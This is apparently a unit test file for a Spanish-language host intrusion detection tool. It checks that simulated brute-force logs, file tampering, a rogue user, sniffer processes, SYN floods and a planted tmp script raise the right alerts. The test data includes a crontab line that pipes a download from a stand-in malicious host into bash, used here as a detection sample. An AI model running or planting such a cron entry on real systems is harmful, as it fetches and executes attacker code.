import os
import tempfile
import unittest
from pathlib import Path

from detection.file_integrity import crear_baseline
from detection.user_monitor import crear_baseline_usuarios
from core.runner import (
    ejecutar_comando,
    leer_texto,
    ejecutar_ciclo_deteccion,
)


PASSWD_BASE = """root:x:0:0:root:/root:/bin/bash
hips_svc:x:987:986:HIPS Service:/nonexistent:/usr/sbin/nologin
ile:x:1000:1000:Ile:/home/ile:/bin/bash
"""


class TestRunner(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        os.environ["HIPS_LOG_DIR"] = self.temp_dir.name

    def tearDown(self):
        self.temp_dir.cleanup()
        os.environ.pop("HIPS_LOG_DIR", None)

    def test_leer_texto_archivo_existente(self):
        archivo = Path(self.temp_dir.name) / "archivo.txt"
        archivo.write_text("hola", encoding="utf-8")

        self.assertEqual(leer_texto(str(archivo)), "hola")

    def test_leer_texto_archivo_inexistente(self):
        self.assertEqual(leer_texto("/ruta/no/existe.txt"), "")

    def test_ejecutar_comando(self):
        salida = ejecutar_comando(["python3", "-c", "print('ok')"])

        self.assertIn("ok", salida)

    def test_ejecutar_ciclo_deteccion_con_entradas_simuladas(self):
        auth_log = Path(self.temp_dir.name) / "secure.log"
        auth_log.write_text(
            "\n".join([
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Invalid user admin from 10.0.0.50 port 22",
                "Failed publickey for root from 10.0.0.50 port 22 ssh2",
                "authentication failure from 10.0.0.50",
            ]),
            encoding="utf-8"
        )

        archivo_critico = Path(self.temp_dir.name) / "critico.txt"
        archivo_critico.write_text("original", encoding="utf-8")
        baseline_archivos = crear_baseline([str(archivo_critico)])
        archivo_critico.write_text("modificado", encoding="utf-8")

        tmp_simulado = Path(self.temp_dir.name) / "tmp"
        tmp_simulado.mkdir()
        backdoor = tmp_simulado / "backdoor.sh"
        backdoor.write_text("#!/bin/bash\necho test", encoding="utf-8")
        backdoor.chmod(0o755)

        baseline_usuarios = crear_baseline_usuarios(PASSWD_BASE)
        passwd_actual = PASSWD_BASE + "intruso:x:2000:2000:Intruso:/home/intruso:/bin/bash\n"

        entradas = {
            "baseline_archivos": baseline_archivos,
            "auth_log_path": str(auth_log),
            "auth_umbral": 5,
            "procesos_texto": "1234 root 0.0 0.1 nmap nmap -sS 127.0.0.1\n2222 root 0.0 0.1 tcpdump tcpdump -i enp0s3",
            "passwd_actual": passwd_actual,
            "baseline_usuarios": baseline_usuarios,
            "system_logs_texto": "kernel: app[777]: segfault at 0 ip 00007f error 4",
            "tmp_path": str(tmp_simulado),
            "crontab_texto": "* * * * * curl http://malicioso.local/payload.sh | bash",
            "mailq_texto": "A1B2C3D4E 1234 Tue Jul 7 user@example.com\n(deferred: Connection timed out)",
            "mailq_umbral": 99,
            "conexiones_texto": "\n".join([
                "SYN-RECV 0 0 192.168.1.10:80 10.0.0.99:20000",
                "SYN-RECV 0 0 192.168.1.10:80 10.0.0.99:20001",
                "SYN-RECV 0 0 192.168.1.10:80 10.0.0.99:20002",
                "SYN-RECV 0 0 192.168.1.10:80 10.0.0.99:20003",
            ]),
            "ddos_umbral_conexiones": 99,
            "ddos_umbral_syn": 4,
        }

        alertas = ejecutar_ciclo_deteccion(entradas)

        self.assertIn("integridad_archivos", alertas)
        self.assertIn("auth_failures", alertas)
        self.assertIn("process_monitor", alertas)
        self.assertIn("sniffers", alertas)
        self.assertIn("user_monitor", alertas)
        self.assertIn("system_logs", alertas)
        self.assertIn("tmp_monitor", alertas)
        self.assertIn("cron_monitor", alertas)
        self.assertIn("mail_queue", alertas)
        self.assertIn("ddos_monitor", alertas)

    def test_respeta_modulos_habilitados(self):
        auth_log = Path(self.temp_dir.name) / "secure.log"
        auth_log.write_text(
            "\n".join([
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Failed password for root from 10.0.0.50 port 22 ssh2",
                "Failed password for root from 10.0.0.50 port 22 ssh2",
            ]),
            encoding="utf-8"
        )

        tmp_simulado = Path(self.temp_dir.name) / "tmp"
        tmp_simulado.mkdir()
        backdoor = tmp_simulado / "backdoor.sh"
        backdoor.write_text("#!/bin/bash\necho test", encoding="utf-8")
        backdoor.chmod(0o755)

        entradas = {
            "modulos_habilitados": {"tmp_monitor"},
            "auth_log_path": str(auth_log),
            "tmp_path": str(tmp_simulado),
            "procesos_texto": "1234 root 99.0 99.0 nmap nmap -sS 127.0.0.1",
            "system_logs_texto": "kernel: app[777]: segfault at 0 ip 00007f error 4",
            "mailq_texto": "A1B2C3D4E 1234 Tue Jul 7 user@example.com",
            "conexiones_texto": "SYN-RECV 0 0 192.168.1.10:80 10.0.0.99:20000",
        }

        alertas = ejecutar_ciclo_deteccion(entradas)

        self.assertIn("tmp_monitor", alertas)
        self.assertNotIn("auth_failures", alertas)
        self.assertNotIn("process_monitor", alertas)
        self.assertNotIn("sniffers", alertas)
        self.assertNotIn("system_logs", alertas)
        self.assertNotIn("mail_queue", alertas)
        self.assertNotIn("ddos_monitor", alertas)

    def test_ejecutar_ciclo_sin_alertas_simuladas(self):
        tmp_vacio = Path(self.temp_dir.name) / "tmp_vacio"
        tmp_vacio.mkdir()

        entradas = {
            "baseline_archivos": {},
            "auth_log_path": None,
            "procesos_texto": "4444 postgres 0.1 0.5 postgres postmaster",
            "passwd_actual": PASSWD_BASE,
            "baseline_usuarios": crear_baseline_usuarios(PASSWD_BASE),
            "system_logs_texto": "systemd started service normally",
            "tmp_path": str(tmp_vacio),
            "crontab_texto": "0 2 * * * /usr/bin/backup",
            "mailq_texto": "Mail queue is empty",
            "conexiones_texto": "ESTAB 0 0 192.168.1.10:22 10.0.0.20:50500",
            "ddos_umbral_conexiones": 5,
            "ddos_umbral_syn": 5,
        }

        alertas = ejecutar_ciclo_deteccion(entradas)

        self.assertEqual(alertas, {})


if __name__ == "__main__":
    unittest.main()
